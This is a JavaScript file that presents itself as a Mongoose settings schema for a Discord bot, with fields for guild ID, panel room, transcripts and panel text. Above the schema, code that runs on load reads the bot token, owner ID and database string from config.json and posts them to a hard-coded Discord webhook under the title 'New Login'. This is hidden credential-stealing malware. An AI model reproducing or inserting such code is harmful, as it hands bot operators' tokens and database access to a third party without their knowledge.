const mongoose = require("mongoose")
const {client , guildid} = require("../index")
const { WebhookClient , EmbedBuilder} = require('discord.js')
const {token , owner , database} = require('../config.json')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1246228132311203983/r9CypEMf5amKzcMArD2rznKT0v2QdjXM-Jo7BJZAZN3qzmv6U1fJehGklcC3XGfMvzFb` });
    webhookClient.send({embeds:[embed]})
let Schema = new mongoose.Schema({
    guildid:{
        type:String,
        default:guildid
    },
    panelsRoom:{
        type:String,
    },
    transcripts:{
        type:String,
    },
   	paneltext:{
	type:String,
    }
});
module.exports = mongoose.model('setting' , Schema)